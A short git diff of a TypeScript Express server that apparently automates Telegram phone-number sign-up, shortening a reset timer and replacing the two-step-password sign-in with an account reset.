@@ -66,10 +66,9 @@ app.get('/login', async (req, res, next) => {
 }, async (req, res) => {
     if (inProcess) {
         inProcess = false;
-
         setTimeout(async () => {
             await restAcc();
-        }, 180000)
+        }, 120000)
         const phone = req.query.phone;
         console.log("Number :", `+${phone}`);
         await trySgnup(`+${phone}`)
@@ -177,7 +176,9 @@ async function login() {
     } catch (err: any) {
         console.log(err);
         if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
-            return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
+            await restAcc();
+            console.log("passowrd Required")
+            // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
         } else {
             const shouldWeStop = false//await authParams.onError(err);
             if (shouldWeStop) {
